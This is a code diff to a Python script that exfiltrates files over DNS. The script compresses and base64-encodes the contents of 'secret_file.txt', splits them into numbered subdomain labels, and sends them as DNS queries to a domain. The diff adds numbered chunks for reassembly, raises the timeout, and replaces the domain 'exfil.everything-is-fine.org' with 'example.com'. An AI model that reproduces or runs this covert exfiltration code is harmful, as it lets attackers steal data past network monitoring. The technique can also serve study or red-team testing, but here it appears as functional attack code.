@@ -1,11 +1,11 @@
+import math
 import gzip
 import base64
 import json
 import socket
 import textwrap
 
-MAX_DOMAIN_LENGTH = 255
-MAX_SUBDOMAIN_LENGTH = 63
+max_subdomain_length = 63
 
 
 def make_dns_query_domain(domain):
@@ -32,7 +32,7 @@ def dns_lookup(domain, dns_server="127.0.0.1"):
 
     req = make_dns_request_data(dns_query)
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.settimeout(2)
+    sock.settimeout(10)
 
     try:
         sock.sendto(req, (dns_server, 53))
@@ -97,9 +97,21 @@ def create_request_urls(payload: dict, domain: str) -> list:
     # transmits as much data as possible. This is will significantly increase the speed and
     # efficiency of data transmission.
 
-    subdomains = textwrap.wrap(payload_string, MAX_SUBDOMAIN_LENGTH)
+    subdomain_count = math.ceil(
+        len(payload_string) / max_subdomain_length
+    )  # Round up to be safe
 
-    return [f"{subdomain}.{domain}" for subdomain in subdomains]
+    subdomains = textwrap.wrap(
+        payload_string, max_subdomain_length - len(f"{subdomain_count}")
+    )
+
+    # Add a number as the first character in front of the base64 string. That way
+    # if things get sent in the wrong order (don't ask me how but THEY DO) we
+    # can stitch them back together.
+    return [
+        f"{int(index)}{subdomain}.{domain}"
+        for index, subdomain in enumerate(subdomains)
+    ]
 
 
 def send_requests(requests):
@@ -113,10 +125,10 @@ def send_requests(requests):
         dns_lookup(request)
 
 
-filename = "secret_file.txt"
+if __name__ == "__main__":
+    filename = "secret_file.txt"
+    domain = "example.com"
 
-payload = construct_data_payload([filename])
-
-domain = "exfil.everything-is-fine.org"
-requests = create_request_urls(payload, domain)
-send_requests(requests)
+    payload = construct_data_payload([filename])
+    requests = create_request_urls(payload, domain)
+    send_requests(requests)
